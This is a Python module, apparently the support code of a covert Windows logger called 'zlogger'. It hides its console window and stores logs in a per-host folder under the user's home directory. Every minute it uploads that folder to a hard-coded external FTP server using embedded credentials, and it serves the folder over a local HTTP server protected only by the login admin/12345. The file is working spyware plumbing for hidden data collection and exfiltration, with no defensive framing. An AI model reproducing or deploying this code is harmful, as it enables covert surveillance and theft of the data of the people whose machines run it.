import socket
import os
import datetime
import netifaces
import winreg
import time
from sync_ftp import SyncFtp
import http.server
import base64
import socketserver

# get the user name as identifier
def user_name():
    user_name = str(socket.gethostname())
    return user_name

# get the current date and time as a string
def current_time():
    current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
    return current_time

#For creating app dir
def dir_path():
    home_path = os.path.expanduser("~")
    dir_name = "zlogger"
    dir_path = os.path.join(home_path, dir_name, user_name())
    if not os.path.exists(dir_path):
        os.makedirs(dir_path)
    os. chdir(dir_path)
    return dir_path

# #this hide function help to minimize the console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

# check if internet is connected or not
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False
    
# Define a function to get the name of an interface from its GUID
def get_interface_name(guid):
    # Open the registry key that contains the mapping
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
    # Try to get the subkey that corresponds to the GUID
    try:
        subkey = winreg.OpenKey(key, guid + r'\Connection')
        # Try to get the value that contains the name
        try:
            name = winreg.QueryValueEx(subkey, 'Name')[0]
            # Return the name
            return name
        except FileNotFoundError:
            # If the value is not found, return None
            return None
    except FileNotFoundError:
        # If the subkey is not found, return None
        return None

#Getting current active network interface
def active_interface():
    active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])
    return active_interface

# Upload log directory to ftp server
def sync():
    home_path = os.path.expanduser("~")
    dir_list = os.listdir(home_path)
    if "zlogger" in dir_list:
        source_path = os.path.join(home_path, "zlogger")
        target_path = "/var/www/html/"

    SYNC = SyncFtp("20.124.217.64", "zlogger", "zlogger")
    
    while True:
        if is_connected() == True:
            print("Internet is available. Syncing to the ftp..")
            SYNC.send_to_ftp(source_path, target_path)
        else:
            print("No internet! Checking for internet connectivity..")
        time.sleep(60)

#Creating local server
class AuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        auth_header = self.headers.get("Authorization")
        if auth_header is None:
            self.send_response(401)
            self.send_header("WWW-Authenticate", "Basic realm=\"Test\"")
            self.end_headers()
            return
        auth_parts = auth_header.split()
        if len(auth_parts) != 2 or auth_parts[0] != "Basic":
            self.send_error(400, "Bad request")
            return
        username, password = base64.b64decode(auth_parts[1]).decode().split(":")
        if username != "admin" or password != "12345":
            self.send_error(403, "Forbidden")
            return
        super().do_GET()

def server():
    PORT = 8000
    DIRECTORY = "./"

    with socketserver.TCPServer(("", PORT), AuthHandler) as httpd:
        print("Local server running at http://localhost:8000")
        httpd.serve_forever()
